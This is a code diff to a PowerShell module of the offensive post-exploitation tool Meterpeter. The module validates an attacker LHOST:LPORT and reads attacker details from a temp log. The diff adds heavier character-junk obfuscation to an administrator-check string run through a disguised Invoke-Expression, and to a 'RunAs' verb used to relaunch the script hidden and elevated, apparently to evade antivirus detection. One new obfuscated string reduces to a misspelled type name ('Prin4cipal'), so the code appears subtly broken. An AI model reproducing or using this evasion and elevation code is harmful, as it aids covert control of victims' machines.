@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: netstat
-   PS cmdlet Dev version: v1.0.8
+   PS cmdlet Dev version: v1.0.9
 
 .DESCRIPTION
    Auxiliary module of Meterpeter v2.10.14 that allow users to
@@ -85,7 +85,7 @@ if(-not($Attacker -match '^(off)$'))
 {
    ## Make sure user inputed the correct lhost:lport format
    # Regex translated to human  1  9  2 .  1  6  8 .  ?  .    ?   :  ?
-   If(-not($Attacker -match '^(\d\d\d\.\d\d\d\.\d*\.)+[\d*]+:[\d*]+$'))
+   If(-not($Attacker -match '^(\d{1,3}\.\d{1,3}\.\d*\.)+[\d*]+:[\d*]+$'))
    {
       write-host "`n[x] Error: wrong LHOST:LPORT format input`n" -ForegroundColor Red
       Remove-Item -Path "$Env:TMP\Programdata.log" -Force
@@ -95,7 +95,7 @@ if(-not($Attacker -match '^(off)$'))
 }
 
 
-If($StartTime -Match '^(\d\d:\d\d)$')
+If($StartTime -Match '^(\d{2}:\d{2})$')
 {
    <#
    .SYNOPSIS
@@ -123,13 +123,13 @@ If($StartTime -Match '^(\d\d:\d\d)$')
 
 
 $Counter = 0 ## Set loop function counter to '0'
+$AdminRaw = "(£_[§S@e§c£_ur§it£_y.§P£_r@in§c£_ip§al.£_Wi£_n§d@o£_ws§P£_r@in§c£_ipa§l]£_[§S£_e@c§u£_r@it£_y.§P£_r§i@n£_ci@pa£_l.§W£_i@nd£_o@wsId@e£_n§ti@ty]:£_:§G@e£_tC£_u§r@re£_n@t(§)).§I@sI£_nR@o§£_le@(§[£_S£_e@c§u£_r§i@t§y.§P£_r§i@n4c£_ip@al.§W§i£_n@d§o£_w§s@B§u£_il@tI£_n@Ro£_l@e]:£_:A£_d@m§i£_n§i£_s@t§r£_a§t@o£_r)" -replace '(@|£_|§)',''
 $Attacker = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Server:"|Select-Object -First 1) -replace '^(Server: )','')
 $AgentPath = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Client:"|Select-Object -First 1) -replace '^(Client: )','')
-$AdminRaw = "(£[S@ec£urit£y.P£r@inc£ipal.£Wi£nd@o£wsP£r@inc£ipal]£[S£e@cu£r@it£y.P£ri@n£ci@pa£l.W£i@nd£o@wsId@e£nti@ty]:£:G@e£tC£ur@re£n@t()).I@sI£nR@o£le@([£S£e@cu£ri@ty.P£ri@nc£ip@al.Wi£n@do£ws@Bu£il@tI£n@Ro£l@e]:£:A£d@mi£ni£s@tr£at@o£r)" -replace '(@|£)',''
 $AdminCheck = $AdminRaw|&('XeX' -replace '^(X)','i')
 If($AdminCheck -match '^(False)$')
 {
-   $Namelless = "%R@u%nA@s%" -replace '(@|%)',''
+   $Namelless = "%R@£u%n£A@s£%" -replace '(@|%|£)',''
    write-host "[*] Relaunch console as an elevated process!"
    Start-Process -WindowStyle Hidden powershell "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb $Namelless
    exit
